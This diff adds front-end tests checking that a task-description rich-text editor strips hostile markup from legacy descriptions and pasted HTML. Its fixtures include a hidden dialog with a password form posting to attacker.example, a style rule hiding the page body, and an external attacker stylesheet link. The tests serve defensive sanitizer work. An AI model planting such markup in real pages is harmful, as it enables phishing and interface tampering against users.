@@ -338,3 +338,164 @@ it("idle sync shows a newer description while a set-aside draft stays offered an
   expect(reopened.getByText("Restore changes")).toBeTruthy();
   expect(http.patch).toHaveBeenCalledTimes(1);
 });
+
+// A task created from a template before every write path sanitized its
+// description can still hold markup like this.
+const LEGACY_DESCRIPTION =
+  "<p>Legacy <strong>notes</strong></p>" +
+  "<style>body{display:none}</style>" +
+  '<button command="show-modal" commandfor="own">Open</button>' +
+  '<dialog id="own"><form action="https://attacker.example/login">' +
+  '<input type="password"></form></dialog>' +
+  '<div popover id="pop">Popover</div>' +
+  '<button popovertarget="pop">Show</button>' +
+  "<svg><style>#root{outline:9px solid red}</style></svg>";
+
+it("a reader's view of a legacy description shows its text but none of its active markup", async () => {
+  const screen = render(
+    <TaskDescription
+      taskId={`task-legacy-${++suffix}`}
+      description={LEGACY_DESCRIPTION}
+      canEdit={false}
+    />,
+    { wrapper },
+  );
+  await tick();
+  const view = screen.container.querySelector(".prose")!;
+  expect(view.innerHTML).toBe(
+    "<p>Legacy <strong>notes</strong></p>OpenPopoverShow",
+  );
+  // Tiptap injects its own editor styles; nothing else may add a sheet.
+  expect(
+    document.querySelectorAll("style:not([data-tiptap-style]), link"),
+  ).toHaveLength(0);
+  expect(getComputedStyle(document.body).display).not.toBe("none");
+});
+
+it("an editor opened on a legacy description loads only its text and formatting", async () => {
+  const id = `task-legacy-edit-${++suffix}`;
+  const screen = render(
+    <TaskDescription taskId={id} description={LEGACY_DESCRIPTION} canEdit />,
+    { wrapper },
+  );
+  await tick();
+  expect(currentEditor().getHTML()).toBe(
+    "<p>Legacy <strong>notes</strong></p><p>OpenPopoverShow</p>",
+  );
+  expect(
+    screen.container.querySelectorAll(
+      "style, dialog, button[command], [popover], [popovertarget], svg",
+    ),
+  ).toHaveLength(0);
+});
+
+// jsdom has no ClipboardEvent; EditorView.pasteHTML creates one.
+class TestClipboardEvent extends Event {
+  readonly clipboardData = null;
+}
+
+function captureClipboardDocuments() {
+  vi.stubGlobal("ClipboardEvent", TestClipboardEvent);
+  const created: Document[] = [];
+  const createHTMLDocument = document.implementation.createHTMLDocument.bind(
+    document.implementation,
+  );
+  const spy = vi
+    .spyOn(document.implementation, "createHTMLDocument")
+    .mockImplementation((title?: string) => {
+      const doc = createHTMLDocument(title);
+      created.push(doc);
+      return doc;
+    });
+  return {
+    created,
+    restore: () => {
+      spy.mockRestore();
+      vi.unstubAllGlobals();
+    },
+  };
+}
+
+it("pasted style sheets never reach the document prosemirror-view inlines styles from", async () => {
+  const id = `task-paste-style-${++suffix}`;
+  render(<TaskDescription taskId={id} description="<p></p>" canEdit />, {
+    wrapper,
+  });
+  await tick();
+  const clipboard = captureClipboardDocuments();
+  act(() => {
+    currentEditor().view.pasteHTML(
+      '<meta charset="utf-8"><style>.cb{font-weight:bold}</style>' +
+        '<link rel="stylesheet" href="https://attacker.example/x.css">' +
+        '<p><span class="cb">Pasted</span> text</p>' +
+        "<svg><style>p{color:red}</style></svg>" +
+        "<noscript><style>p{color:red}</style></noscript>",
+    );
+  });
+  clipboard.restore();
+  expect(clipboard.created.length).toBeGreaterThan(0);
+  for (const doc of clipboard.created) {
+    expect(doc.querySelectorAll("style, link, meta")).toHaveLength(0);
+    expect(doc.styleSheets).toHaveLength(0);
+  }
+  await tick(801);
+  expect(http.patch).toHaveBeenCalledWith(`tasks/${id}`, {
+    json: { description: "<p>Pasted text</p>" },
+    context: { expectedUserId: "task-editor-user" },
+  });
+});
+
+it("a paste with style- and link- custom elements keeps their text, not their tags", async () => {
+  const id = `task-paste-custom-${++suffix}`;
+  render(<TaskDescription taskId={id} description="<p></p>" canEdit />, {
+    wrapper,
+  });
+  await tick();
+  const clipboard = captureClipboardDocuments();
+  act(() => {
+    currentEditor().view.pasteHTML(
+      '<meta charset="utf-8"><p>See <link-preview data-url="https://example.com/docs" style="color: rgb(0, 0, 0);">the docs</link-preview>' +
+        ' and <style-chip style="font-weight: 400;">a chip</style-chip>, plus <code>&lt;style&gt;x&lt;/style&gt;</code> here</p>',
+    );
+  });
+  clipboard.restore();
+  await tick(801);
+  expect(http.patch).toHaveBeenCalledWith(`tasks/${id}`, {
+    json: {
+      description:
+        "<p>See the docs and a chip, plus <code>&lt;style&gt;x&lt;/style&gt;</code> here</p>",
+    },
+    context: { expectedUserId: "task-editor-user" },
+  });
+});
+
+it("an ordinary rich-text paste is stored as before", async () => {
+  const id = `task-paste-plain-${++suffix}`;
+  render(<TaskDescription taskId={id} description="<p></p>" canEdit />, {
+    wrapper,
+  });
+  await tick();
+  const clipboard = captureClipboardDocuments();
+  act(() => {
+    currentEditor().view.pasteHTML(
+      "<meta charset='utf-8'><h2>Heading</h2>" +
+        '<p><strong>Bold</strong>, <em>italic</em>, <s>struck</s> and <a href="https://example.com/a?b=1&amp;c=2">a link</a></p>' +
+        '<ul><li>One</li><li>Two</li></ul><ol start="4"><li>Four</li></ol>' +
+        "<blockquote><p>Quoted</p></blockquote><pre><code>x &lt; y</code></pre>" +
+        '<p style="font-weight:bold">Inline styled</p><table><tr><td>Cell</td></tr></table>',
+    );
+  });
+  clipboard.restore();
+  await tick(801);
+  expect(http.patch).toHaveBeenCalledWith(`tasks/${id}`, {
+    json: {
+      description:
+        "<h2>Heading</h2>" +
+        '<p><strong>Bold</strong>, <em>italic</em>, <s>struck</s> and <a target="_blank" rel="noopener noreferrer nofollow" href="https://example.com/a?b=1&amp;c=2">a link</a></p>' +
+        '<ul><li><p>One</p></li><li><p>Two</p></li></ul><ol start="4"><li><p>Four</p></li></ol>' +
+        "<blockquote><p>Quoted</p></blockquote><pre><code>x &lt; y</code></pre>" +
+        "<p><strong>Inline styled</strong></p><p>Cell</p>",
+    },
+    context: { expectedUserId: "task-editor-user" },
+  });
+});
